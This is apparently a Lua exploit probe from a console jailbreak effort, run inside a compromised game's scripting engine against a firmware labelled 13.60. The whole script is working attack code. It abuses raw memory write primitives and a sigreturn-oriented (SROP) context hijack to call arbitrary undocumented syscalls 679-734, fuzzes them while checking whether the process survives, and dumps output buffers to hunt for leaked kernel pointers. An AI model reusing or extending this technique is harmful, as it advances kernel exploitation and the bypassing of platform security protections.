-- CRASH_CLASS: HIGH
-- PROBE 162a: Sysent 679-734 isolation survey
--
-- 677/678 are lethal+game-crash. 679-734 is unexplored.
-- 13.60 capture has 735 entries, 677-694 and 700-734 are real code.
-- Use one connection per syscall to isolate crashes.
-- But we can't do one-per-connection in a single probe.
-- Instead: test each with pcall, check pid after each.
-- If a call kills the process, we won't get output for later ones.
-- So group them: test 5 at a time, most likely to survive first.
--
-- From 13.60 CSV: 695-699 are nosys stubs. Try those first (safest).
-- Then 679-694, then 700-734.

print("=== PROBE 162a: SYSENT 679-734 SURVEY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Allocate output buffer for syscalls that might write output
local outbuf = gpu + 0x20000
for off = 0, 0xFFF, 4 do wd(outbuf + off, 0) end

-- Test a syscall with zero args via SROP
local function test_sys(num)
    -- Clear output buffer area
    for off = 0, 0x3F, 4 do wd(outbuf + off, 0) end

    local rv = srop(num)
    if rv == nil then
        return "PCALL-FAIL"
    end
    local h, l = get_hi_lo(rv)
    if h == 0xFFFFFFFF and l == 0xFFFFFFFF then
        return "ret=-1"
    elseif h == 0 then
        return "ret=" .. l
    else
        return "ret=0x" .. string.format("%X%08X", h, l)
    end
end

-- Test a syscall with a buffer arg (for syscalls that might copy out data)
local function test_sys_buf(num)
    for off = 0, 0xFF, 4 do wd(outbuf + off, 0) end
    wd(outbuf, 0x100) -- size field at start

    local rv = srop(num, ga(0x20000), uint64(0x100))
    if rv == nil then
        return "PCALL-FAIL", false
    end
    local h, l = get_hi_lo(rv)

    -- Check if buffer was written
    local written = false
    for off = 4, 0x3F, 4 do
        if rd(outbuf + off) ~= 0 then
            written = true
            break
        end
    end

    if h == 0xFFFFFFFF and l == 0xFFFFFFFF then
        return "ret=-1", written
    elseif h == 0 then
        return "ret=" .. l, written
    else
        return "ret=0x" .. string.format("%X%08X", h, l), written
    end
end

-- Phase 1: Test 695-699 (nosys on 13.60, should be safe)
print("--- [1] NOSYS RANGE 695-699 ---")
for num = 695, 699 do
    local r = test_sys(num)
    print("sys " .. num .. ": " .. r)
    if to_num(make_syscall(20)()) ~= pid then
        print("*** PID CHANGED — process replaced ***")
        break
    end
end

print("")
print("alive_check=" .. to_num(make_syscall(20)()))

-- Phase 2: Test 679-694 with zero args
print("")
print("--- [2] RANGE 679-694 ---")
for num = 679, 694 do
    local r = test_sys(num)
    print("sys " .. num .. ": " .. r)
    -- Quick survival check
    local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
    if not alive_ok or to_num(alive_pid) ~= pid then
        print("*** DIED at sys " .. num .. " ***")
        print("=== DONE (died) ===")
        return
    end
end

print("")
print("alive_check=" .. to_num(make_syscall(20)()))

-- Phase 3: Test 700-720 with zero args
print("")
print("--- [3] RANGE 700-720 ---")
for num = 700, 720 do
    local r = test_sys(num)
    print("sys " .. num .. ": " .. r)
    local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
    if not alive_ok or to_num(alive_pid) ~= pid then
        print("*** DIED at sys " .. num .. " ***")
        print("=== DONE (died) ===")
        return
    end
end

print("")
print("alive_check=" .. to_num(make_syscall(20)()))

-- Phase 4: Test 721-734 with zero args
print("")
print("--- [4] RANGE 721-734 ---")
for num = 721, 734 do
    local r = test_sys(num)
    print("sys " .. num .. ": " .. r)
    local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
    if not alive_ok or to_num(alive_pid) ~= pid then
        print("*** DIED at sys " .. num .. " ***")
        print("=== DONE (died) ===")
        return
    end
end

-- Phase 5: For any that returned 0, retest with buffer args
print("")
print("--- [5] BUFFER RETESTS ---")
local interesting = {}
for num = 679, 734 do
    if num < 695 or num > 699 then -- skip nosys
        local r = test_sys(num)
        if r == "ret=0" then
            table.insert(interesting, num)
        end
        local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
        if not alive_ok or to_num(alive_pid) ~= pid then
            print("*** DIED in retest ***")
            break
        end
    end
end

for _, num in ipairs(interesting) do
    local r, written = test_sys_buf(num)
    print("sys " .. num .. " (buf): " .. r .. (written and " DATA_WRITTEN" or ""))
    if written then
        -- Dump first 16 qwords
        for off = 0, 0x78, 8 do
            local val = memory.read_qword(outbuf + off)
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                print("  +" .. string.format("%02X", off) .. "=0x" ..
                    string.format("%X%08X", vh, vl))
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
